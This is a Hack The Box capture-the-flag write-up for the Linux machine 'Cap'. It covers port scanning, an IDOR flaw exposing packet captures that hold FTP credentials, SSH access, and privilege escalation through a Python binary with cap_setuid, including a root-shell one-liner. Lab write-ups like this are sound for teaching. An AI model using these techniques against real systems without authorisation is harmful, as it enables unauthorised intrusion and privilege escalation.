# Hack The Box — Cap

## 🧠 Machine Information
- Name: Cap
- OS: Linux
- Difficulty: Easy
- Platform: Hack The Box

---

## 🔍 Enumeration

### Nmap Scan
```bash
nmap -A -p- --min-rate=2000 <TARGET_IP>
```

**Open Ports:**
- 21/tcp — FTP
- 22/tcp — SSH
- 80/tcp — HTTP

---

## 🌐 Web Enumeration

The web application provides a **Security Snapshot** feature.  
After running a snapshot, the browser is redirected to a URL of the format:

```
/data/<id>
```

By manually modifying the `id` value (IDOR vulnerability), it is possible to access **other snapshot files**.

---

## 📁 IDOR & File Disclosure

By fuzzing the `/data/` endpoint, multiple snapshot files were discovered.

Some of these files contained **PCAP (packet capture) files**.

Using Wireshark, sensitive data was found inside a PCAP file.

### Application Layer Protocol with Sensitive Data
- **FTP**

---

## 🔐 Initial Access

Credentials discovered from the FTP traffic in the PCAP file were used to log in via SSH.

```bash
ssh user@<TARGET_IP>
```

---

## 🚀 Privilege Escalation

### Linux Capabilities

Linux capabilities were enumerated using:

```bash
getcap -r / 2>/dev/null
```

Output revealed a binary with dangerous capabilities:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The `cap_setuid` capability allows a process to change its UID, which can be abused to obtain root privileges.

### Exploitation

Using Python to spawn a root shell:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Root access successfully obtained.

---

## 🏁 Root Access

```bash
whoami
root
```

> FLAG: [REDACTED]

---

## 📌 Key Takeaways
- IDOR vulnerabilities can lead to serious data exposure
- PCAP files may contain sensitive credentials
- Linux capabilities can be abused for privilege escalation
- `cap_setuid` on scripting binaries is extremely dangerous

---

## ⚠️ Disclaimer
This write‑up is for **educational purposes only**.  
No flags or sensitive credentials are shared in accordance with Hack The Box rules.
